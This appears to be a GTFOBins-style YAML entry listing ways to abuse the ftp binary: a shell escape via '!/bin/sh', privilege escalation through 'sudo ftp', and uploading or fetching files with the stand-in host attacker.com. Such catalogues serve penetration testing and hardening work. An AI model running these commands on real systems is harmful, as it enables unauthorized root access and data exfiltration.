---
functions:
  shell:
    - code: |
        ftp
        !/bin/sh
  file-upload:
    - description: Send local file to a FTP server.
      code: |
        RHOST=attacker.com
        ftp $RHOST
        put file_to_send
  file-download:
    - description: Fetch a remote file from a FTP server.
      code: |
        RHOST=attacker.com
        ftp $RHOST
        get file_to_get
  sudo:
    - code: |
        sudo ftp
        !/bin/sh
---
